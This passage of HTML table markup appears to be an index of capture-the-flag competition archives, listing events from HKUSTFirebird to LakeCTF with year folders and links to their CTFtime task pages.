href=\"ctfs/HKUSTFirebird\">HKUSTFirebird</a></td>\n            <td><a href=\"ctfs/HKUSTFirebird/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2225/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/HSCTF\">HSCTF</a></td>\n            <td><a href=\"ctfs/HSCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1984/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HSCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1627/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HSCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1264/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HSCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/939/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HSCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/821/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/h4ckc0n\">h4ckc0n</a></td>\n            <td><a href=\"ctfs/h4ckc0n/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2905/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/hxp\">hxp</a></td>\n            <td><a href=\"ctfs/hxp/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2437/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/hxp/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1845/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/hxp/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1447/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/hxp/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1134/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/hxp/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/647/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=8><a href=\"ctfs/Hack.lu\">Hack.lu</a></td>\n            <td><a href=\"ctfs/Hack.lu/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2842/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Hack.lu/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2438/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Hack.lu/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1921/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Hack.lu/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1727/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Hack.lu/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1452/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Hack.lu/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1142/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Hack.lu/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/830/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Hack.lu/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/699/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/Hack.lu/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/HackASat\">HackASat</a></td>\n            <td><a href=\"ctfs/HackASat/2023/Quals\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1837/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HackASat/2021/Quals\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1365/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/HackCon\">HackCon</a></td>\n            <td><a href=\"ctfs/HackCon/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/652/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/HackHavoc\">HackHavoc</a></td>\n            <td><a href=\"ctfs/HackHavoc/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2532/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/HackPack\">HackPack</a></td>\n            <td><a href=\"ctfs/HackPack/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2333/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HackPack/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1893/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HackPack/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1620/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HackPack/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1307/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HackPack/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1036/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/HackTM\">HackTM</a></td>\n            <td><a href=\"ctfs/HackTM/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/956/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/HackTheVote\">Hack The Vote</a></td>\n            <td><a href=\"ctfs/HackTheVote/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1017/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/HackZoneTunisia\">Hack Zone Tunisia</a></td>\n            <td><a href=\"ctfs/HackZoneTunisia/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1029/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Hackappatoi\">Hackappatoi</a></td>\n            <td><a href=\"ctfs/Hackappatoi/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2163/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Hackappatoi/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1815/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/HackersPlayground\">Hacker's Playground</a></td>\n            <td><a href=\"ctfs/HackersPlayground/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2047/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HackersPlayground/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1396/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HackersPlayground/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1107/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Hackorn\">Hackorn</a></td>\n            <td><a href=\"ctfs/Hackorn/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2919/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Hackover\">Hackover</a></td>\n            <td><a href=\"ctfs/Hackover/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/689/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/HacktivityCon\">HacktivityCon</a></td>\n            <td><a href=\"ctfs/HacktivityCon/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1444/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HacktivityCon/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1101/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Harekaze\">Harekaze</a></td>\n            <td><a href=\"ctfs/Harekaze/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/789/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Harekaze/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/549/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Hayyim\">Hayyim</a></td>\n            <td><a href=\"ctfs/Hayyim/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1553/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/HeroCTF\">HeroCTF</a></td>\n            <td><a href=\"ctfs/HeroCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2496/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HeroCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1951/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HeroCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1663/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HeroCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1284/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/HexionCTF\">Hexion</a></td>\n            <td><a href=\"ctfs/HexionCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1014/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ICHSA\">ICHSA</a></td>\n            <td><a href=\"ctfs/ICHSA/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1359/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/IERAE\">IERAE</a></td>\n            <td><a href=\"ctfs/IERAE/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2655/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/IERAE/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2441/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/IJCTF\">IJCTF</a></td>\n            <td><a href=\"ctfs/IJCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1382/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/IJCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1003/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/IMF\">IMF</a></td>\n            <td><a href=\"ctfs/IMF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2831/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/INShAck\">INS'hAck</a></td>\n            <td><a href=\"ctfs/INShAck/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/763/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/IRON\">IRON</a></td>\n            <td><a href=\"ctfs/IRON/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2497/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/ISITDTU\">ISITDTU</a></td>\n            <td><a href=\"ctfs/ISITDTU/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2456/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ISITDTU/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2080/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ISITDTU/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1757/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ISITDTU/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1464/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ISITDTU/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/803/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ISITDTU/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/642/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/ImaginaryCTF\">ImaginaryCTF</a></td>\n            <td><a href=\"ctfs/ImaginaryCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2396/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ImaginaryCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2015/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ImaginaryCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1670/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/ImaginaryCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1344/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/InCTF\">InCTF</a></td>\n            <td><a href=\"ctfs/InCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1714/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/InCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1370/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/InCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/981/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/InCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/849/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/InCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/662/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/InCTF/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/INCOGNITO\">INCOGNITO</a></td>\n            <td><a href=\"ctfs/INCOGNITO/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2316/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/INCOGNITO/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1632/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/InfoSec\">InfoSec</a></td>\n            <td><a href=\"ctfs/InfoSec/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1823/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/IngonyamaZK\">IngonyamaZK</a></td>\n            <td><a href=\"ctfs/IngonyamaZK/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1996/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/insomnihack\">insomnihack</a></td>\n            <td><a href=\"ctfs/insomnihack/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2139/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/insomnihack/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1831/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/insomnihack/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1505/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/insomnihack/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/686/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/involuntaryCTF\">involuntaryCTF</a></td>\n            <td><a href=\"ctfs/involuntaryCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2813/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Intent\">Intent</a></td>\n            <td><a href=\"ctfs/Intent/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1454/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/InterlogicaCTFs\">InterlogicaCTFs</a></td>\n            <td><a href=\"ctfs/InterlogicaCTFs/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2301/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/InternetFestival\">InternetFestival</a></td>\n            <td><a href=\"ctfs/InternetFestival/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1855/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/IrisCTF\">IrisCTF</a></td>\n            <td><a href=\"ctfs/IrisCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2503/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/IrisCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2085/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/IrisCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1774/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Jade\">Jade</a></td>\n            <td><a href=\"ctfs/Jade/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1791/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/JerseyCTF\">JerseyCTF</a></td>\n            <td><a href=\"ctfs/JerseyCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2667/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/JerseyCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2230/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/JerseyCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1590/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Junior.Crypt\">Junior.Crypt</a></td>\n            <td><a href=\"ctfs/Junior.Crypt/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2798/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Junior.Crypt/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2259/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/K17\">K17</a></td>\n            <td><a href=\"ctfs/K17/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2902/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/KalmarCTF\">KalmarCTF</a></td>\n            <td><a href=\"ctfs/KalmarCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2599/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/KalmarCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2227/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/KalmarCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1878/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Kashi\">Kashi</a></td>\n            <td><a href=\"ctfs/Kashi/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2668/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/KasperskyCTF\">Kaspersky</a></td>\n            <td><a href=\"ctfs/KasperskyCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/701/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Kind4SUS\">Kind4SUS</a></td>\n            <td><a href=\"ctfs/Kind4SUS/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2703/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/KITCTFCTF\">KITCTFCTF</a></td>\n            <td><a href=\"ctfs/KITCTFCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1965/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/KITCTFCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1810/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/KillerQueen\">KillerQueen</a></td>\n            <td><a href=\"ctfs/KillerQueen/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1482/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/KipodAfterFree\">KipodAfterFree</a></td>\n            <td><a href=\"ctfs/KipodAfterFree/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1133/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/KipodAfterFree/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/945/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/KubanCTF\">KubanCTF</a></td>\n            <td><a href=\"ctfs/KubanCTF/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2092/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/L3HCTF\">L3HCTF</a></td>\n            <td><a href=\"ctfs/L3HCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2823/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/L3HCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2236/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/L3HCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1510/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/L3akCTF\">L3akCTF</a></td>\n            <td><a href=\"ctfs/L3akCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2629/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/L3akCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2322/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/KnightCTF\">KnightCTF</a></td>\n            <td><a href=\"ctfs/KnightCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2610/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/KnightCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2209/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/KnightCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1545/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/LA\">LA</a></td>\n            <td><a href=\"ctfs/LA/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2592/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LA/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2102/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LA/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1732/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/LINE\">LINE</a></td>\n            <td><a href=\"ctfs/LINE/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2819/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LINE/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2119/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LINE/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1716/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LINE/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1472/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LINE/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1269/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/LIT\">LIT</a></td>\n            <td><a href=\"ctfs/LIT/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2890/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LIT/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2444/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LIT/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2052/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LIT/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1694/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/LIT/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1398/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/LakeCTF\">LakeCTF</a></td>\n            <td><a href=\"ctfs/LakeCTF/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2502/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            